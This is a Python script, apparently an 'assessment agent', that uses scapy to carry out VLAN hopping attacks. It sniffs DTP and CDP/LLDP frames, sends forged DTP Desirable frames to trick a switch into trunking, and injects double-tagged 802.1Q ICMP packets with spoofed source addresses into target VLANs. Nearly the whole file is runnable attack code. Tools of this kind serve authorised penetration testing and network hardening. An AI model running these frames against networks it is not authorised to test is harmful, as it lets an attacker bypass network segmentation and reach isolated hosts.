#!/usr/bin/env python3
"""VLAN hopping assessment agent using scapy for DTP and double-tagging tests."""

import subprocess
import sys
import os
import json
from datetime import datetime

try:
    from scapy.all import (
        Ether, Dot1Q, IP, ICMP, sendp, sniff, get_if_hwaddr,
        conf, LLC, SNAP, Raw
    )
except ImportError:
    print("Install: pip install scapy")
    sys.exit(1)


def get_interface_info(iface="eth0"):
    """Get network interface details."""
    mac = get_if_hwaddr(iface)
    result = subprocess.run(
        ["ip", "link", "show", iface], capture_output=True, text=True
    )
    return {"interface": iface, "mac": mac, "status": result.stdout.strip()}


def check_vlan_config(iface="eth0"):
    """Check current VLAN configuration on the interface."""
    vlan_config = None
    try:
        with open("/proc/net/vlan/config", "r") as f:
            vlan_config = f.read()
    except FileNotFoundError:
        pass
    return {"vlan_config": vlan_config}


def listen_for_dtp(iface="eth0", timeout=30):
    """Listen for DTP frames to assess trunk negotiation status."""
    dtp_frames = []
    def dtp_handler(pkt):
        if pkt.haslayer(LLC):
            dtp_frames.append({
                "src": pkt[Ether].src,
                "dst": pkt[Ether].dst,
                "time": str(datetime.now()),
            })
    sniff(iface=iface, filter="ether dst 01:00:0c:cc:cc:cc",
          prn=dtp_handler, timeout=timeout, store=0)
    return {
        "dtp_frames_received": len(dtp_frames),
        "dtp_active": len(dtp_frames) > 0,
        "details": dtp_frames,
    }


def listen_for_cdp_lldp(iface="eth0", timeout=60):
    """Capture CDP/LLDP frames to discover switch information."""
    discovery_frames = []
    def handler(pkt):
        discovery_frames.append({
            "src": pkt[Ether].src,
            "type": hex(pkt[Ether].type) if pkt[Ether].type else "LLC",
            "time": str(datetime.now()),
            "length": len(pkt),
        })
    sniff(iface=iface,
          filter="ether proto 0x88cc or (ether dst 01:00:0c:cc:cc:cc)",
          prn=handler, timeout=timeout, store=0)
    return {"frames": discovery_frames, "switch_discovered": len(discovery_frames) > 0}


def send_dtp_desirable(iface="eth0", count=10):
    """Send DTP desirable frames to attempt trunk negotiation."""
    mac = get_if_hwaddr(iface)
    dtp_frame = (
        Ether(dst="01:00:0c:cc:cc:cc", src=mac) /
        LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
        SNAP(OUI=0x00000C, code=0x2004) /
        Raw(load=bytes([
            0x00, 0x01, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x02, 0x00, 0x05, 0x03,
            0x00, 0x03, 0x00, 0x05, 0xA5,
            0x00, 0x04, 0x00, 0x0A,
        ]) + bytes.fromhex(mac.replace(":", "")))
    )
    sendp(dtp_frame, iface=iface, count=count, inter=1, verbose=False)
    return {"frames_sent": count, "type": "DTP Desirable", "interface": iface}


def create_vlan_interface(iface, vlan_id, ip_addr):
    """Create a VLAN subinterface."""
    subprocess.run(["modprobe", "8021q"], capture_output=True)
    vlan_iface = f"{iface}.{vlan_id}"
    subprocess.run(
        ["ip", "link", "add", "link", iface, "name", vlan_iface,
         "type", "vlan", "id", str(vlan_id)],
        capture_output=True
    )
    subprocess.run(
        ["ip", "addr", "add", f"{ip_addr}/24", "dev", vlan_iface],
        capture_output=True
    )
    subprocess.run(["ip", "link", "set", vlan_iface, "up"], capture_output=True)
    return {"vlan_interface": vlan_iface, "vlan_id": vlan_id, "ip": ip_addr}


def send_double_tagged(iface, outer_vlan, inner_vlan, target_ip):
    """Send double-tagged 802.1Q frames for VLAN hopping."""
    mac = get_if_hwaddr(iface)
    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
        Dot1Q(vlan=outer_vlan) /
        Dot1Q(vlan=inner_vlan) /
        IP(dst=target_ip, src=f"10.10.{inner_vlan}.99") /
        ICMP(type=8)
    )
    sendp(pkt, iface=iface, count=5, inter=1, verbose=False)
    return {
        "type": "Double Tagged",
        "outer_vlan": outer_vlan,
        "inner_vlan": inner_vlan,
        "target_ip": target_ip,
        "note": "Unidirectional - no responses expected",
    }


def cleanup_vlan_interfaces(iface, vlan_ids):
    """Remove VLAN subinterfaces created during testing."""
    removed = []
    for vid in vlan_ids:
        vlan_iface = f"{iface}.{vid}"
        result = subprocess.run(
            ["ip", "link", "del", vlan_iface], capture_output=True
        )
        removed.append({"interface": vlan_iface, "success": result.returncode == 0})
    return removed


def run_assessment(iface="eth0", target_vlans=None, target_ips=None):
    """Run full VLAN hopping assessment."""
    if target_vlans is None:
        target_vlans = [10, 20]
    if target_ips is None:
        target_ips = {10: "10.10.10.1", 20: "10.10.20.1"}
    report = {
        "timestamp": datetime.now().isoformat(),
        "interface": get_interface_info(iface),
        "tests": [],
    }
    dtp_listen = listen_for_dtp(iface, timeout=15)
    report["tests"].append({"test": "DTP Listening", "result": dtp_listen})
    dtp_send = send_dtp_desirable(iface)
    report["tests"].append({"test": "DTP Switch Spoofing", "result": dtp_send})
    for vlan_id in target_vlans:
        ip = target_ips.get(vlan_id, f"10.10.{vlan_id}.1")
        dt_result = send_double_tagged(iface, 1, vlan_id, ip)
        report["tests"].append({"test": f"Double Tagging VLAN {vlan_id}", "result": dt_result})
    cleanup_vlan_interfaces(iface, target_vlans)
    return report


def print_report(report):
    print("VLAN Hopping Assessment Report")
    print("=" * 50)
    print(f"Date: {report['timestamp']}")
    print(f"Interface: {report['interface']['interface']} ({report['interface']['mac']})")
    for test in report["tests"]:
        print(f"\n--- {test['test']} ---")
        for k, v in test["result"].items():
            print(f"  {k}: {v}")


if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    result = run_assessment(iface)
    print_report(result)
